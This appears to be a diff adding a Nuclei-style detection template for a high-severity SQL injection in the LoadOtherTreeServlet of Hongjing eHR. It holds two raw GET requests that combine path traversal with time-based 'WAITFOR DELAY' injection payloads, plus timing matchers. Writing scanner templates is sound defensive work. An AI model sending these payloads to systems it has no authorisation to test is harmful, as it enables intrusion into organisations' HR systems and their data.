@@ -1,0 +1,33 @@
+id: hongjingeHR-LoadOtherTreeServlet-sql
+
+info:
+  name: 宏景eHR LoadOtherTreeServlet SQL注入漏洞
+  author: unknown
+  severity: high
+  tags: sql injection
+
+
+
+http:
+  - raw:
+      - |
+        GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--&flag=1 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A10%27--&flag=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=6 && duration_1<=7'  
+          - 'duration_2>=10 && duration_2<=11'  
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
